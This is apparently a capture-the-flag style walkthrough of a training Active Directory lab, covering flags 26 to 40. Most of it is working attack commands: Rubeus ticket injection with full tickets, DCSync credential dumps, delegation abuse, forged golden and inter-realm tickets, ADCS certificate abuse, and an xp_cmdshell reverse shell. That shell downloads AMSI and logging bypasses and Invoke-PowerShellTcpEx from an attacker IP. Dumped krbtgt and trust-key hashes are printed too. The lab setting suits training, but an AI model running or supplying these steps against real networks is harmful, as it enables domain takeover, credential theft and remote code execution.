C:\AD\Tools\Rubeus.exe ptt /ticket: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
```

<figure><img src="../.gitbook/assets/Pasted image 20231025164640 (1).png" alt=""><figcaption></figcaption></figure>

And launch safetykatz to dcsync

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

_Escalate to Enterprise Admins privileges by abusing Printer Bug!_ We need to do the same thing with the Rubeus monitoring

```powershell
winrs -r:dcorp-appsrv cmd
```

```powershell
C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```

And now we triggher the authentication from mcorp-dco dcorp-appsrv

```powershell
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

<figure><img src="../.gitbook/assets/Pasted image 20231025165834.png" alt=""><figcaption></figcaption></figure>

Use rubeus to import the ticket locally

```powershell
C:\AD\Tools\Rubeus.exe ptt /ticket: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
```

And use safetykatz to dcsync and dump the hash

```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

<figure><img src="../.gitbook/assets/Pasted image 20231025170101.png" alt=""><figcaption></figcaption></figure>

`krbtgt - moneycorp.local`

| Type         | Hash                                                             |
| ------------ | ---------------------------------------------------------------- |
| Password     | null                                                             |
| NTLM         | a0981492d5dfab1ae0b97b51ea895ddf                                 |
| aes256\_hmac | 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e |

### **FLAG 26/27 - Value of msds-allowedtodelegate to attribute of dcorp-adminsrv**

* Enumerate users in the domain for who Constrained Delegation is enabled.
  * For such a user, request a TGT from the DC and obtain a TGS for the service to which delegation is configured.
  * Pass the ticket and access the service.
* Enumerate computer accounts in the domain for which Constrained Delegation is enabled.
  * For such a user, request a TGT from the DC.
  * Obtain an alternate TGS for LDAP service on the target machine.
  * Use the TGS for executing DCSync attack

_Enumerate users in the domain for who Constrained Delegation is enabled._ Import powerview and use it

```powerview
Get-DomainUser -TrustedToAuth
```

&#x20;

<figure><img src="../.gitbook/assets/Pasted image 20231026123711.png" alt=""><figcaption></figcaption></figure>

We already pwnd the account websvc, so we can request a TGT as domain administrator to access the mssql server with S4U

```powerview
C:\AD\Tools\Rubeus.exe s4u /user:websvc /aes256:2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7 /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.LOCAL" /ptt
```

Try access the mssql server

```cmd
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

<figure><img src="../.gitbook/assets/Pasted image 20231106114056.png" alt=""><figcaption></figcaption></figure>

#### _Abuse Constrained Delegation using websvc with Kekeo_&#x20;

Try use kekeo to abuse Constrained Delegation. We can also use NTLM hash of websvc First we request a tgt

```kekeo
tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
```

<figure><img src="../.gitbook/assets/Pasted image 20231106121112.png" alt=""><figcaption></figcaption></figure>

Aftert that we can use the S4U technique

```kekeo
tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~ dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorpmssql.dollarcorp.moneycorp.LOCAL
```

Now use invoke-mimi to use the ticker

```powershell
Invoke-Mimi -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

#### _Abuse Constrained Delegation using dcorp-adminsrv with Rubeus_

We have AES hash of dcorp-adminsrv$ from dcorp-adminsrv machine. First use Rubeus to obtain and import a ticket

```cmd
C:\AD\Tools\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51 /impersonateuser:Administrator /msdsspn:time/dcorp-dc.dollarcorp.moneycorp.LOCAL /altservice:ldap /ptt
```

Now use safetykatz to dcsync dollarcorp.moneycorp.local

```cmd
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

<figure><img src="../.gitbook/assets/Pasted image 20231106152932.png" alt=""><figcaption></figcaption></figure>

### _FLAG 28 - Computer account on which ciadmin can configure Resource-based Constrained Delegation_

• Find a computer object in dcorp domain where we have Write permissions. • Abuse the Write permissions to access that computer as Domain Admin.

_Find a computer object in dcorp domain where we have Write permissions_ Using PowerView we can look for interesting ACL (Permission)

```powerview
Find-InterestingDomainACL
```

To look for something on ciadmin

```powerview
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'ciadmin'}
```

<figure><img src="../.gitbook/assets/Pasted image 20231113115334.png" alt=""><figcaption></figcaption></figure>

_Abuse the Write permissions to access that computer as Domain Admin._ We already pwned ciadmin (I didn't saved the credentials...) But we can access also with the reverse shell from jenkill Now as persistence move(can also be a privesc btw) we can permit the delegation to dcorp-mgmt from our attack box to gain access as administrator on the machine on request Using powerview

```powerview
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-student115$' -Verbose
```

Check if is setted

```powerview
Get-DomainRBCD
```

Now from your attack box (or whatever machine you configured)you can abuse the delegation

### **FLAG 29 - SID history injected to escalate to Enterprise Admins**

\*Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using the domain trust key. \*

First we need to retrieve the trust key in for the trust between dollarcorp and moneycorp using mimikatz Grab the ticket for svcadmin account and spawn a shell

```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Copy the loader on dcorp-dc, create the tunnel and use safetykatz to extract the key

```cmd
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

```cmd
winrs -r:dcorp-dc cmd
```

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115
```

```cmd
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```

Extract the key

```mimikatz
lsadump::trust /patch
```

All this process to dump the key could be done with invoke-mimi (obs with the ticket)

```mimikatz
Invoke-Mimi -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

<figure><img src="../.gitbook/assets/Pasted image 20231113153820 (1).png" alt=""><figcaption></figcaption></figure>

`Trust key - dcorp-dc -> mcorp-dc`

| Type   | Hash                                                             |
| ------ | ---------------------------------------------------------------- |
| aes256 | b15b7f4bc043a97ec2378a0c418ec75aa1270f38365d86a0b109b2084c4adb8a |
| NTLM   | 988f695ef97fb2f8523346c70795d802                                 |

`Trust key - mcorp-dc -> dcorp-dc`

| Type   | Hash                                                             |
| ------ | ---------------------------------------------------------------- |
| aes256 | 1b788fc631ec90ca9d9649d0f8d134e957c44dce09b26f01eef51f852986a1cd |
| NTLM   | 988f695ef97fb2f8523346c70795d802                                 |

Now you can frge a ticket with SID History of Enterprise Admins.Use BetterSafeyKatz

```BetterSafetyKatz
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:988f695ef97fb2f8523346c70795d802 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```

<figure><img src="../.gitbook/assets/Pasted image 20231113155053 (1).png" alt=""><figcaption></figcaption></figure>

Now use rubeus to use the ticket and get access on mcorp-dc

```cmd
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
```

<figure><img src="../.gitbook/assets/Pasted image 20231113155312 (1).png" alt=""><figcaption></figcaption></figure>

&#x20;Test it

<figure><img src="../.gitbook/assets/Pasted image 20231113155355.png" alt=""><figcaption></figcaption></figure>

### FLAG 30 - _NTLM hash of krbtgt of moneycorp.local_

_Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash_

With the hash of krbtgt account from dcorp-dc we can create an inter-realm TGT and inject. Using Rubeus

```Rubeus
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /krbtgt:4e9815869d2090ccfca61c1fe0d23986 /ptt" "exit"
```

<figure><img src="../.gitbook/assets/Pasted image 20231113161101 (1).png" alt=""><figcaption></figcaption></figure>

Test it

<figure><img src="../.gitbook/assets/Pasted image 20231113161326.png" alt=""><figcaption></figcaption></figure>

&#x20;Now we can also run a DC-Sync against mcorp-dc to extract the his secrets

```cmd
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

`krbTGT - mcorp-dc`

| Type   | Hash                                                             |
| ------ | ---------------------------------------------------------------- |
| aes256 | 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e |
| NTLM   | a0981492d5dfab1ae0b97b51ea895ddf                                 |

### **FLAG 31/32 - Service for which a TGS is requested from eurocorp-dc AND Contents of secret.txt on eurocorp-dc**

_With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest._ The trust key between dollarcorp and eurocorp is needed Grab the ticket for svcadmin account and spawn a shell

```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Copy the loader on dcorp-dc, create the tunnel and use safetykatz to extract the key

```cmd
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

```cmd
winrs -r:dcorp-dc cmd
```

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.115
```

```cmd
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```

Extract the key

```mimikatz
lsadump::trust /patch
```

<figure><img src="../.gitbook/assets/Pasted image 20231113164739.png" alt=""><figcaption></figcaption></figure>

All this process to dump the key could be done with invoke-mimi (obs with the ticket)

```mimikatz
Invoke-Mimi -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

`Trust key - dcorp-dc -> eurocorp-dc`

| Type   | Hash                                                             |
| ------ | ---------------------------------------------------------------- |
| aes256 | b498d4487775dbbb3ffcbcb189609416998263ae71f1ea96a8c61d7a6c8e565a |
| NTLM   | 8c03a02ed433a4408a5cdf8136692b03                                 |

`Trust key - eurocorp-dc -> dcorp-dc`

| Type   | Hash                                                             |
| ------ | ---------------------------------------------------------------- |
| aes256 | 4790c156625ac9e7a888e4a957dc08c868dea0710a8f1a24385bf784333f1b80 |
| NTLM   | 8c03a02ed433a4408a5cdf8136692b03                                 |

And now craft an Inter-Realm TGT use it with Rubeus

```bettersafetykatz
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:8c03a02ed433a4408a5cdf8136692b03 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
```

```cmd
C:\AD\Tools\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
```

<figure><img src="../.gitbook/assets/Pasted image 20231113165304.png" alt=""><figcaption></figcaption></figure>

Check if we have access to the shared folder on eurocorp-dc&#x20;

<figure><img src="../.gitbook/assets/Pasted image 20231113165804.png" alt=""><figcaption></figcaption></figure>

### **FLAG 33/34/35/36 - ADCS**

* Check if AD CS is used by the target forest and find any vulnerable/abusable templates.
* Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.

_Check if AD CS is used by the target forest and find any vulnerable/abusable templates._ Use Certify to check for ADCS presence

```cmd
C:\AD\Tools\Certify.exe cas
```

to list all templates

```cmd
C:\AD\Tools\Certify.exe find
```

#### _ESC1_ To look for ESC1 using certify

```cmd
C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
```

<figure><img src="../.gitbook/assets/Pasted image 20231115104637.png" alt=""><figcaption></figcaption></figure>

&#x20;Let's request a certificate for Enterprise Administrator - Administrator (you can choose every account)

```cmd
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

<figure><img src="../.gitbook/assets/Pasted image 20231115122934.png" alt=""><figcaption></figcaption></figure>

&#x20;Copy the RSA Private Key and use openssl to convert it to pkcs12

```cmd
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-ea.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
```

<figure><img src="../.gitbook/assets/Pasted image 20231115123809.png" alt=""><figcaption></figcaption></figure>

&#x20;Now use rubeus to print a TGT to access as enterprise administrator

```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1-EA.pfx /password:bruno /ptt
```

<figure><img src="../.gitbook/assets/Pasted image 20231115124038.png" alt=""><figcaption></figcaption></figure>

#### _ESC3_ Use certify to find the vulnerable template

```cmd
C:\AD\Tools\Certify.exe find /vulnerable
```

<figure><img src="../.gitbook/assets/Pasted image 20231115124542.png" alt=""><figcaption></figcaption></figure>

The "SmartCardEnrollment-Agent" template has EKU for Certificate Request Agent and grants enrollment rights to Domain users. If we can find another template that has an EKU that allows for domain authentication and has application policy requirement of certificate request agent, we can request certificate on behalf of any user. !\[\[Pasted image 20231115124740.png]] Now use certify to request the vulnerable template certificate

```cmd
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

<figure><img src="../.gitbook/assets/Pasted image 20231115125330.png" alt=""><figcaption></figcaption></figure>

Now save the id rsa and the certificate in one file like "esc3.pem" and coverti it with openssl

```cmd
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-agent.pfx
```

<figure><img src="../.gitbook/assets/Pasted image 20231115125649.png" alt=""><figcaption></figcaption></figure>

Now we can request the certificate as Enterprise Administrator

```cmd
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:mcorp\administrator /enrollcert:C:\AD\Tools\esc3-agent.pfx /enrollcertpw:bruno
```

Now save the id rsa and the certificate in one file like "esc3-ea.pem" and coverti it with openssl

```cmd
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\ESC3-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc3-ea.pfx
```

Import it with rubeus

```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc3-ea.pfx /dc:mcorp-dc.moneycorp.local /password:bruno /ptt
```

<figure><img src="../.gitbook/assets/Pasted image 20231115130234.png" alt=""><figcaption></figcaption></figure>

#### &#x20;_ESC 6_ The CA in moneycorp has EDITF\_ATTRIBUTESUBJECTALTNAME2 flag set.

```cmd
C:\AD\Tools\Certify.exe cas
```

<figure><img src="../.gitbook/assets/Pasted image 20231115141409.png" alt=""><figcaption></figcaption></figure>

Look for a template that allow enrollment for normal user

```cmd
C:\AD\Tools\Certify.exe find
```

and request a certificate as any user you want using the "CA-integration" template

```cmd
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:moneycorp.local\administrator
```

<figure><img src="../.gitbook/assets/Pasted image 20231115142421.png" alt=""><figcaption></figcaption></figure>

&#x20;Save it and convert it

```cmd
C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc6-ea.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc6-ea.pfx
```

<figure><img src="../.gitbook/assets/Pasted image 20231115142542.png" alt=""><figcaption></figcaption></figure>

&#x20;Now use it with Rubeus to gain access

```cmd
C:\AD\Tools\Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:C:\AD\Tools\esc6-ea.pfx /dc:mcorp-dc.moneycorp.local /password:bruno /ptt
```

<figure><img src="../.gitbook/assets/Pasted image 20231115142707.png" alt=""><figcaption></figcaption></figure>

### **FLAG 37/38/39/40 - SQL**

* Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorpmssql.

Let’s start with enumerating SQL servers in the domain and if we has privileges to connect to any of them. We can use PowerUpSQL module for that. ==USE INVISHELL== If you have ticket in the klist this will not work

```powershell
Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
```

```powershell
Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
```

<figure><img src="../.gitbook/assets/Pasted image 20231115161040.png" alt=""><figcaption></figcaption></figure>

&#x20;So, we can connect to dcorp-mssql. Using HeidiSQL client, let’s login to dcorp-mssql using our windows. To check other database links

```sql
select * from master..sysservers
```

<figure><img src="../.gitbook/assets/Pasted image 20231115161752.png" alt=""><figcaption></figcaption></figure>

Enumerate further

```sql
select * from openquery("DCORP-SQL1",'select * from master..sysservers')
```

<figure><img src="../.gitbook/assets/Pasted image 20231115161947.png" alt=""><figcaption></figcaption></figure>

We can concatenate the query to enumerate more further

```sql
select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
```

<figure><img src="../.gitbook/assets/Pasted image 20231115162150.png" alt=""><figcaption></figcaption></figure>

It's possible also to use powersql to crawl all link without launch queries

```powersql
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
```

<figure><img src="../.gitbook/assets/Pasted image 20231115162316.png" alt=""><figcaption></figcaption></figure>

&#x20;So we have the sysadmin from eu-sql server If xp\_cmdshell is enabled ==(or RPC out is true - which is set to false in this case)==, it is possible to execute commands on eu-sql using linked databases. To avoid dealing with a large number of quotes and escapes, we can use the following command:

```powersql
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
```

<figure><img src="../.gitbook/assets/Pasted image 20231115164116.png" alt=""><figcaption></figcaption></figure>

To retrieve a reverse shell

```powersql
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.115/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.115/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.115/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql15
```

<figure><img src="../.gitbook/assets/Pasted image 20231115163650.png" alt=""><figcaption></figcaption></figure>

**KNOW WHAT!?!?!?**&#x20;

<figure><img src="../.gitbook/assets/Pasted image 20231115164218.png" alt=""><figcaption></figcaption></figure>
